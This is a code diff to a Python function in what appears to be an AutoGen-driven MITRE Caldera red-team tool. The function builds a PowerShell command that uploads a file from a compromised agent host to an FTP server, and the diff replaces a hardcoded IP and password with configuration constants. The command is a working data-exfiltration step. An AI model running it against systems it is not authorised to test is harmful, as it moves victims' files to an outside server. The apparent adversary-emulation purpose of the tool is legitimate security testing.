@@ -5,6 +5,7 @@ import json
 import utils.constants
 from time import sleep
 import base64
+import os
 from autogen.agentchat.contrib.capabilities.context_handling import (
     truncate_str_to_tokens,
 )
@@ -111,14 +112,13 @@ def caldera_upload_file_from_agent(
     str,
     "The result of the upload operation",
 ]:
+    # Get base name of the file
+    basename = file_path.split("\\")[-1]
 
-    # Get filename from path
-    filename = file_path.split("/")[-1]
-
-    command = f"""$ftp = 'ftp://192.168.162.11:2100/{filename}'; 
-    $user = 'user'; $pass = '12345'; $webclient = New-Object System.Net.WebClient; 
+    command = f"""$ftp = 'ftp://{utils.constants.FTP_SERVER_ADDRESS}/{basename}'; 
+    $user = '{utils.constants.FTP_SERVER_USER}'; $pass = '{utils.constants.FTP_SERVER_PASS}'; $webclient = New-Object System.Net.WebClient; 
     $webclient.Credentials = New-Object System.Net.NetworkCredential($user, $pass); 
-    $webclient.UploadFile($ftp, '{file_path})
+    $webclient.UploadFile($ftp, '{file_path}')
     """
 
     print(command)
